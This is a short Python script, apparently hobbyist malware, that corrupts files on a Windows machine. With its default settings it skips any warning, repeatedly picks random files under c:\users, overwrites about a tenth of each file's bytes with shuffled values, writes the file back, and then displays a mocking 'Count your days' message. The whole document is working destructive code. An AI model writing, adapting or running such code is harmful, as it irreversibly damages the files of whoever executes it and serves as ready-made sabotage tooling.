#Libraries
import base64
import os
import random as rand
import tkinter.messagebox as tkMsg

#Variables
#inten = 8*1000 #corruption intensity ##Unused
debug = False #console log stuff
do_destruction = True

# debug check
if debug:
    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='question')


# Main destructive part
# skips destruction if the check is false
if not(do_destruction):
    print('jej')
else:
    for i in range(12800):
        try:
            # init
            direc = 'c:\\users'

            #While loop for targeting random files
            while not(os.path.isfile(direc)): #shit straight up doesn't work
                try:
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)
                    direc = direc+'\\'+randChoice

                    # If statement if it finds a file
                    if os.path.isfile(direc):
                        if debug:
                            print('found a file')
                        break
                except:
                    # Runs this in case it goes for a directory or a read only file
                    direc = 'c:\\users'
                    dirList = os.listdir(os.path.expanduser(direc))
                    randChoice = rand.choice(dirList)

            # Opens the file and converts it to an array
            with open(direc,'rb') as bFile:
                arrayList = list(bFile.read())


            # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
            #This for loop swaps values with neighboring ones
            try:
                for i in range(round(len(arrayList)/10)):
                    arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
            except:
                print('failed to shift file')

            #convert array list to bytearray
            byteArray = bytearray(arrayList)

            #export file
            finalFile = open(direc, 'wb')
            finalFile.write(bytes(byteArray))
            finalFile.close()

            # Debug log stuff
            if debug:
                print('wrote to file')
        except:
            # rerolls the file incase it errors out
            print('rerolling')

# shows this message after destruction
if do_destruction:
    tkMsg.showinfo(title='get rekt lmfao',message='Count your days.')